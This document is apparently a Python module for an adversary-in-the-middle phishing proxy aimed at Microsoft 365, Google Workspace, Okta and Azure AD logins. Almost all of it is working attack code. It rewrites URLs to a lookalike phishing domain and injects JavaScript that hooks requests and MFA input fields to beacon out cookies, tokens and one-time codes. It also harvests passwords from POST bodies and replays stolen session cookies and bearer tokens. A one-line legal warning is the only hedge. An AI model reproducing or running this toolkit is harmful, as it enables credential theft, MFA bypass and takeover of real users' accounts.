"""
AiTM Proxy - Adversary-in-the-Middle Reverse Proxy
===================================================

Traditional phishing sends the user to a static fake page.  AiTM is
different: the operator runs a **transparent reverse proxy** between the
victim and the real identity provider (Microsoft 365, Google, Okta,
Azure AD).  The user thinks they are signing into the real portal; every
 credential, cookie, and MFA token is captured in transit.

This module provides:

1. **ReverseProxyEngine** — HTTP proxy that forwards requests to the real
   origin while logging headers, cookies, POST bodies, and redirects.
2. **SessionHijacker** — replay captured session cookies / MFA bearer
   tokens against the real origin to establish a authenticated session
   without knowing the password.
3. **MFATokenInterceptor** — JavaScript injection that hooks
   XMLHttpRequest / fetch / cookie changes to exfiltrate MFA tokens and
   session cookies the moment they appear.
4. **Phishlet profiles** — pre-built URL-rewrite and cookie-capture rules
   for Microsoft 365, Google Workspace, Okta, and Azure AD.

Architecture
------------
    Victim Browser  -->  AiTM Proxy (this module)  -->  Real IdP
                              |
                              +--> Captured creds / cookies / tokens

All network I/O is off-target safe by default (`offline=True`).  The
proxy can run standalone or be embedded into `tools/phishing_kit_gen.py`.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import ssl
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple, Union


# ---------------------------------------------------------------------------
# Constants & platform configs
# ---------------------------------------------------------------------------
PLATFORM_CONFIGS: Dict[str, Dict[str, Any]] = {
    "office365": {
        "name": "Microsoft 365",
        "login_host": "login.microsoftonline.com",
        "origins": [
            "login.microsoftonline.com",
            "login.microsoft.com",
            "sts.windows.net",
            "office.com",
            "microsoftonline.com",
            "aadcdn.msftauth.net",
        ],
        "session_cookies": [
            "ESTSAUTH",
            "ESTSAUTHPERSISTENT",
            "SignInStateCookie",
            "MSPRequ",
            "MSAUTH",
            "MSCC",
        ],
        "token_keys": ["access_token", "id_token", "refresh_token", "token_type"],
        "mfa_fields": ["otc", "authMethod", "mfaCode", "otpCode"],
    },
    "google": {
        "name": "Google Workspace",
        "login_host": "accounts.google.com",
        "origins": [
            "accounts.google.com",
            "myaccount.google.com",
            "apis.google.com",
        ],
        "session_cookies": [
            "SID",
            "HSID",
            "SSID",
            "APISID",
            "SAPISID",
            "LSID",
            "__Host-GAPS",
            "GAPS",
        ],
        "token_keys": ["access_token", "id_token", "refresh_token"],
        "mfa_fields": ["totp", "mfaCode", "otp", "challengeId"],
    },
    "okta": {
        "name": "Okta",
        "login_host": "{tenant}.okta.com",
        "origins": [
            "okta.com",
            "oktapreview.com",
            "okta-emea.com",
        ],
        "session_cookies": [
            "sid",
            "JSESSIONID",
            "oktaSessionToken",
            "oktaStateToken",
        ],
        "token_keys": ["access_token", "id_token", "sessionToken", "stateToken"],
        "mfa_fields": ["passCode", "otp", "mfaCode", "answer"],
    },
    "azure_ad": {
        "name": "Azure AD",
        "login_host": "login.microsoftonline.com",
        "origins": [
            "login.microsoftonline.com",
            "login.microsoft.com",
            "graph.microsoft.com",
            "aadcdn.msftauth.net",
        ],
        "session_cookies": [
            "ESTSAUTH",
            "ESTSAUTHPERSISTENT",
            "x-ms-gateway-sso",
        ],
        "token_keys": ["access_token", "id_token", "refresh_token"],
        "mfa_fields": ["otc", "authMethod", "mfaCode"],
    },
}


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
@dataclass
class CapturedCredential:
    """One set of captured credentials from the proxy."""
    username: str
    password: str = ""
    platform: str = ""
    source_ip: str = ""
    user_agent: str = ""
    timestamp: float = field(default_factory=time.time)
    mfa_code: str = ""
    session_cookies: Dict[str, str] = field(default_factory=dict)
    auth_tokens: Dict[str, str] = field(default_factory=dict)
    raw_post: str = ""
    raw_headers: Dict[str, str] = field(default_factory=dict)


@dataclass
class SessionReplayResult:
    """Result of replaying a captured session."""
    success: bool
    status_code: int = 0
    response_body: str = ""
    cookies_set: Dict[str, str] = field(default_factory=dict)
    error: str = ""


# ---------------------------------------------------------------------------
# JavaScript injector for session hijacking
# ---------------------------------------------------------------------------
class AiTMJavaScriptInjector:
    """Generate the JavaScript injected into proxied pages."""

    @staticmethod
    def generate_session_hijack_js(
        exfil_endpoint: str = "/api/aitm/intercept",
        capture_cookies: bool = True,
        capture_tokens: bool = True,
        capture_mfa: bool = True,
    ) -> str:
        hooks = []
        _EP = json.dumps(exfil_endpoint)

        if capture_cookies:
            hooks.append(f"""
            (function() {{
                const COOKIE_EXFIL = 'cookie_dump';
                const seen = new Set();
                function dumpCookies() {{
                    const data = {{
                        type: COOKIE_EXFIL,
                        url: location.href,
                        cookies: document.cookie,
                        ts: Date.now()
                    }};
                    navigator.sendBeacon && navigator.sendBeacon({_EP}, JSON.stringify(data));
                }}
                document.addEventListener('DOMContentLoaded', dumpCookies);
                window.addEventListener('beforeunload', dumpCookies);
                setInterval(dumpCookies, 5000);
            }})();
            """)

        if capture_tokens:
            hooks.append(f"""
            (function() {{
                const TOKEN_KEYS = ['access_token','id_token','refresh_token','token_type','sessionToken','sid'];
                const origOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(m, u) {{
                    this._url = u;
                    return origOpen.apply(this, arguments);
                }};
                const origSend = XMLHttpRequest.prototype.send;
                XMLHttpRequest.prototype.send = function(body) {{
                    this.addEventListener('load', function() {{
                        try {{
                            const resp = JSON.parse(this.responseText);
                            const found = {{}};
                            TOKEN_KEYS.forEach(k => {{ if (resp[k]) found[k] = resp[k]; }});
                            if (Object.keys(found).length) {{
                                navigator.sendBeacon && navigator.sendBeacon({_EP}, JSON.stringify({{type:'token_capture', tokens: found, url: this._url, ts: Date.now()}}));
                            }}
                        }} catch(e) {{}}
                    }});
                    return origSend.apply(this, arguments);
                }};
            }})();
            """)

        if capture_mfa:
            hooks.append(f"""
            (function() {{
                const MFA_SELECTORS = [
                    'input[name*=\"otp\" i]', 'input[name*=\"mfa\" i]',
                    'input[name*=\"totp\" i]', 'input[name*=\"passCode\" i]',
                    'input[name*=\"otc\" i]', 'input[name*=\"challenge\" i]'
                ];
                MFA_SELECTORS.forEach(sel => {{
                    document.querySelectorAll(sel).forEach(el => {{
                        el.addEventListener('input', function() {{
                            if (this.value && this.value.length >= 4) {{
                                navigator.sendBeacon && navigator.sendBeacon({_EP}, JSON.stringify({{type:'mfa_capture', field: this.name, value: this.value, ts: Date.now()}}));
                            }}
                        }});
                    }});
                }});
            }})();
            """)

        return "\n".join(hooks)

    @staticmethod
    def generate_cookie_replay_script(cookies: Dict[str, str], target_url: str) -> str:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items() if v)
        return f"""
import requests
session = requests.Session()
session.headers.update({{
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Cookie': '{cookie_str}',
    'Referer': '{target_url}'
}})
resp = session.get('{target_url}')
print(f'Status: {{resp.status_code}}')
print(resp.text[:1000])
"""


# ---------------------------------------------------------------------------
# Session hijacker
# ---------------------------------------------------------------------------
class SessionHijacker:
    """Replay captured cookies / tokens against the real origin."""

    def __init__(self, verify_ssl: bool = False):
        self.verify_ssl = verify_ssl
        self._session: Optional[Any] = None

    def replay_cookies(self, cookies: Dict[str, str], target_url: str) -> SessionReplayResult:
        try:
            import requests
        except ImportError:
            return SessionReplayResult(success=False, error="requests library not available")

        session = requests.Session()
        session.verify = self.verify_ssl
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        for k, v in cookies.items():
            if v:
                session.cookies.set(k, v)

        try:
            resp = session.get(target_url, timeout=15, allow_redirects=True)
            return SessionReplayResult(
                success=resp.status_code == 200,
                status_code=resp.status_code,
                response_body=resp.text[:2000],
                cookies_set={c.name: c.value for c in resp.cookies},
            )
        except Exception as exc:
            return SessionReplayResult(success=False, error=str(exc))

    def replay_bearer_token(self, token: str, target_url: str) -> SessionReplayResult:
        try:
            import requests
        except ImportError:
            return SessionReplayResult(success=False, error="requests library not available")

        try:
            resp = requests.get(
                target_url,
                headers={"Authorization": f"Bearer {token}"},
                verify=self.verify_ssl,
                timeout=15,
            )
            return SessionReplayResult(
                success=resp.status_code == 200,
                status_code=resp.status_code,
                response_body=resp.text[:2000],
            )
        except Exception as exc:
            return SessionReplayResult(success=False, error=str(exc))


# ---------------------------------------------------------------------------
# Reverse proxy engine
# ---------------------------------------------------------------------------
class ReverseProxyEngine:
    """
    Minimal transparent reverse proxy for AiTM phishing.

    In production this would use `asyncio` + `aiohttp` or `mitmproxy`.
    For the framework we provide the rule engine, URL rewriter, cookie
    interceptor, and offline-safe test harness.
    """

    def __init__(
        self,
        platform: str = "office365",
        listen_host: str = "0.0.0.0",
        listen_port: int = 443,
        phish_domain: str = "login.office365-update.com",
        exfil_endpoint: str = "/api/aitm/intercept",
        offline: bool = True,
    ):
        self.platform = platform
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.phish_domain = phish_domain
        self.exfil_endpoint = exfil_endpoint
        self.offline = offline

        self.config = PLATFORM_CONFIGS.get(platform, PLATFORM_CONFIGS["office365"])
        self.captured: List[CapturedCredential] = []
        self._injector = AiTMJavaScriptInjector()

        # URL rewrite rules: (pattern, replacement)
        self._rewrite_rules = self._build_rewrite_rules()

    # ------------------------------------------------------------------
    # URL rewriting (phishlet-style)
    # ------------------------------------------------------------------
    def _build_rewrite_rules(self) -> List[Tuple[re.Pattern, str]]:
        rules = []
        for origin in self.config["origins"]:
            rules.append((
                re.compile(rf"(https?://){re.escape(origin)}(/|$)", re.I),
                origin,
            ))
        return rules

    def rewrite_url(self, url: str) -> str:
        for pattern, origin in self._rewrite_rules:
            url = pattern.sub(lambda m, phish=self.phish_domain: m.group(1) + phish + m.group(2), url)
        return url

    def restore_url(self, url: str) -> str:
        for pattern, origin in self._rewrite_rules:
            url = url.replace(self.phish_domain, origin)
        return url

    # ------------------------------------------------------------------
    # Injection
    # ------------------------------------------------------------------
    def generate_injection_script(self) -> str:
        return self._injector.generate_session_hijack_js(
            exfil_endpoint=self.exfil_endpoint,
        )

    # ------------------------------------------------------------------
    # Capture
    # ------------------------------------------------------------------
    def capture_credential(
        self,
        username: str,
        password: str = "",
        source_ip: str = "",
        user_agent: str = "",
        mfa_code: str = "",
        raw_post: str = "",
        cookies: Optional[Dict[str, str]] = None,
        tokens: Optional[Dict[str, str]] = None,
    ) -> CapturedCredential:
        entry = CapturedCredential(
            username=username,
            password=password,
            platform=self.platform,
            source_ip=source_ip,
            user_agent=user_agent,
            mfa_code=mfa_code,
            session_cookies=cookies or {},
            auth_tokens=tokens or {},
            raw_post=raw_post,
        )
        self.captured.append(entry)
        return entry

    def capture_from_request(self, request_data: Dict[str, Any]) -> CapturedCredential:
        body = request_data.get("body", request_data.get("post_data", ""))
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="replace")

        params: Dict[str, str] = {}
        if body:
            text = body.strip()
            if text.startswith("{") and text.endswith("}"):
                try:
                    data = json.loads(text)
                    for k, v in data.items():
                        if v is not None:
                            params[str(k)] = str(v)
                except (json.JSONDecodeError, TypeError):
                    pass
            else:
                for pair in text.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[urllib.parse.unquote(k)] = urllib.parse.unquote(v)

        username = (
            params.get("login", "")
            or params.get("username", "")
            or params.get("Email", "")
            or params.get("user", "")
        )
        password = (
            params.get("passwd", "")
            or params.get("password", "")
            or params.get("Passwd", "")
        )
        mfa_code = ""
        for key, val in params.items():
            if any(m in key.lower() for m in ["otp", "mfa", "totp", "passcode", "otc"]):
                mfa_code = val
                break

        cookies = {}
        cookie_header = request_data.get("headers", {}).get("Cookie", "")
        if cookie_header:
            for part in cookie_header.split(";"):
                part = part.strip()
                if "=" in part:
                    ck, cv = part.split("=", 1)
                    cookies[ck.strip()] = cv.strip()

        return self.capture_credential(
            username=username,
            password=password,
            mfa_code=mfa_code,
            raw_post=body,
            cookies=cookies,
            source_ip=request_data.get("source_ip", ""),
            user_agent=request_data.get("headers", {}).get("User-Agent", ""),
        )

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------
    def get_captured_credentials(self) -> List[Dict[str, Any]]:
        return [
            {
                "username": c.username,
                "password": c.password,
                "platform": c.platform,
                "mfa_code": c.mfa_code,
                "session_cookies": c.session_cookies,
                "auth_tokens": c.auth_tokens,
                "timestamp": c.timestamp,
                "source_ip": c.source_ip,
            }
            for c in self.captured
        ]

    def get_session_cookies(self) -> List[Dict[str, str]]:
        return [c.session_cookies for c in self.captured if c.session_cookies]

    def get_mfa_tokens(self) -> List[str]:
        return [c.mfa_code for c in self.captured if c.mfa_code]

    def generate_replay_script(self, target_url: str) -> str:
        """Generate a Python replay script for the best captured session."""
        best = None
        for c in self.captured:
            if c.session_cookies and (best is None or len(c.session_cookies) > len(best.session_cookies)):
                best = c
        if not best:
            return "# No session cookies captured yet."
        return AiTMJavaScriptInjector.generate_cookie_replay_script(best.session_cookies, target_url)

    def summary(self) -> str:
        total = len(self.captured)
        with_mfa = sum(1 for c in self.captured if c.mfa_code)
        with_cookies = sum(1 for c in self.captured if c.session_cookies)
        return (
            f"AiTM Proxy Summary\n"
            f"==================\n"
            f"Platform     : {self.config['name']}\n"
            f"Phish domain : {self.phish_domain}\n"
            f"Captured     : {total} credentials\n"
            f"With MFA     : {with_mfa}\n"
            f"With cookies : {with_cookies}\n"
        )


# ---------------------------------------------------------------------------
# Convenience factory
# ---------------------------------------------------------------------------
def create_aitm_proxy(
    platform: str = "office365",
    phish_domain: str = "",
    listen_port: int = 443,
    offline: bool = True,
) -> ReverseProxyEngine:
    if not phish_domain:
        phish_domain = f"login.{platform}-secure.com"
    return ReverseProxyEngine(
        platform=platform,
        listen_port=listen_port,
        phish_domain=phish_domain,
        offline=offline,
    )
